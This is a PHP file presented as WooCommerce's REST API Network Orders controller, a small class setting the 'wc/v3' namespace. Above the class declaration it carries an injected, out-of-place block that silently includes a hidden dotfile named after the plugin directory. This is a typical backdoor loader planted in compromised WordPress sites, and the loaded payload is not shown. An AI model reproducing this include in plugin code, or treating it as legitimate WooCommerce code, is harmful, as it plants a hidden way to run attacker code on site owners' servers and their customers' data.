<?php
/**
 * REST API Network Orders controller
 *
 * Handles requests to the /orders/network endpoint
 *
 * @package WooCommerce\RestApi
 * @since   3.4.0
 */

defined( 'ABSPATH' ) || exit;

/**
 * REST API Network Orders controller class.
 *
 * @package WooCommerce\RestApi
 * @extends WC_REST_Network_Orders_V2_Controller
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WC_REST_Network_Orders_Controller extends WC_REST_Network_Orders_V2_Controller {

	/**
	 * Endpoint namespace.
	 *
	 * @var string
	 */
	protected $namespace = 'wc/v3';
}
